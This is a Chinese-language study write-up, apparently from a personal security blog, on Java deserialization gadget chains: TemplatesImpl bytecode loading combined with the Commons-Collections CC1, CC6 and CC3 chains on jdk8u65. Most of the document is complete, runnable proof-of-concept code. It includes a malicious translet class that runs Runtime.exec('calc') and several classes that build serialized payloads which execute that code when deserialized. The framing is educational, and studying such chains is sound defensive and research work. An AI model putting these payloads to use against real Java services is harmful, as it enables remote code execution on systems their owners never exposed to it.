# 环境

- jdk8u65
- Commons-Collections 3.2.1

# TemplateImpl

在上一篇关于字节码的文章中简单过了一下TemplateImpl的利用链：https://itroyesivan.github.io/2023/12/03/javasec-ji-chu-07-zi-jie-ma

再看一下类加载的流程图：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206131222.png)

- loadClass()从已加载的类缓存、父加载器等位置寻找类，在前面没有找到的情况下，执行 findClass()。
- 根据名称或位置或URL加载 .class 字节码,然后使用 defineClass。
- defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类。但它只是加载类，并不执行类。若需要执行，则需要先进行 `newInstance()` 的实例化。

接下来看一下TemplateImpl的利用链：

```
TemplatesImpl#getOutputProperties()
  TemplatesImpl#newTransformer()
    TemplatesImpl#getTransletInstance()
      TemplatesImpl#defineTransletClasses()
        TransletClassLoader#defineClass()
      Class#newInstance()
```

getOutputProperties调用newTransformer

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206133015.png)

newTransformer调用getTransletInstance

![image-20231206135811681](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20231206135811681.png)

若`_name`不为null，`_class`为null，则getTransletInstance调用defineTransletClasses

![image-20231206135841481](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20231206135841481.png)

最后defineTransletClasses中调用defineClass

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206140015.png)

注意，下面会检查加载的类是不是AbstractTranslet的子类。这里必须要继承AbstractTranslet：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Calc extends AbstractTranslet {
    public Calc() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

写成静态代码块也是可以的。如果不继承AbstractTranslet而去通过反射修改_auxClasses，那么`_transletIndex`为-1会通不过下面的判断语句从而退出程序：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206151444.png)

整理利用链：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class TemplatesImplTest {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }
    public static void main(String[] args) {
        try {
            byte[] codes = Files.readAllBytes(Paths.get("E:\\xxx\\JavaSec\\code\\target\\classes\\Calc.class"));
            byte[][] _bytecodes = new byte[][] {codes};
            TemplatesImpl templates = new TemplatesImpl();
            setFiledValue(templates, "_bytecodes", _bytecodes);
            setFiledValue(templates, "_name", "whatever");
            setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

`_tfactory`需要注意一下，它是被transient修饰的，也就是说它不会被序列化：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206141637.png)

但是这里要求较低，只要不为null就行：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206143011.png)

在 `readObject()` 方法中，找到了 `_tfactory` 的初始化定义。所以这里直接在反射中将其赋值为 `TransformerFactortImpl` 即可。

`_bytecodes`的写法也要关注一下。它是二维数组类型，但是需要传入defineClass的是一维数组：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206152314.png)

# CC1链实现TemplatesImpl

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206155638.png)

非常好的图，加了点注释。来自https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/#0x05-CC1-%E9%93%BE%E7%9A%84-TemplatesImpl-%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F

先缝合起来尝试一下：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class LazyMap_TemplateImpl {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static void main(String[] args) throws Exception{
        byte[] codes = Files.readAllBytes(Paths.get("E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"));
        byte[][] _bytecodes = new byte[][] {codes};
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", _bytecodes);
        setFiledValue(templates, "_name", "whatever");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
        templates.newTransformer();
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer("templates"),
                new InvokerTransformer("newTransformer",null,null)
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform(1);
    }
}
```

成功弹出计算器，接下来加上剩下的部分：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class LazyMap_TemplateImpl {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static void main(String[] args) throws Exception{
        byte[] codes = Files.readAllBytes(Paths.get("E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"));
        byte[][] _bytecodes = new byte[][] {codes};
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", _bytecodes);
        setFiledValue(templates, "_name", "whatever");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value","Troy3e");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class,outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

# CC6实现TemplatesImpl

也是稍作改动就行

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TemplateImpl_8u71 {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        byte[] codes = Files.readAllBytes(Paths.get("E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"));
        byte[][] _bytecodes = new byte[][] {codes};
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", _bytecodes);
        setFiledValue(templates, "_name", "whatever");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"Troy3e");
        HashMap hashMap = new HashMap();
        hashMap.put(tme,"Troy3e");
        outerMap.remove("Troy3e");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}

```

# CC3

节省时间就直接一步到位了。

寻找newTransformer的调用地点：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206175340.png)

找到TrAXFilter，虽然它是不可序列化的，但是只要它的构造函数即可：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231206175607.png)

CC3 没有调用 `InvokerTransformer`，而是调用了一个新的类 `InstantiateTransformer`：

![image-20231206180109429](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20231206180109429.png)

Class为空则报错，则抛出异常；Class不为空则调用它的构造函数。

测试：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CC3_8u71 {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }
    public static void main(String[] args) throws Exception{
        byte[] codes = Files.readAllBytes(Paths.get("E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"));
        byte[][] _bytecodes = new byte[][] {codes};
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", _bytecodes);
        setFiledValue(templates, "_name", "whatever");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);
    }
}
```

## 利用CC1链

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3_LazyMap_8u71 {
    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }
    public static void main(String[] args) throws Exception{
        byte[] codes = Files.readAllBytes(Paths.get("E:\\研究生\\JavaSec\\code\\target\\classes\\Calc.class"));
        byte[][] _bytecodes = new byte[][] {codes};
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", _bytecodes);
        setFiledValue(templates, "_name", "whatever");
        setFiledValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

## 利用CC6链

类似，就不缝合了。

# 参考链接

https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE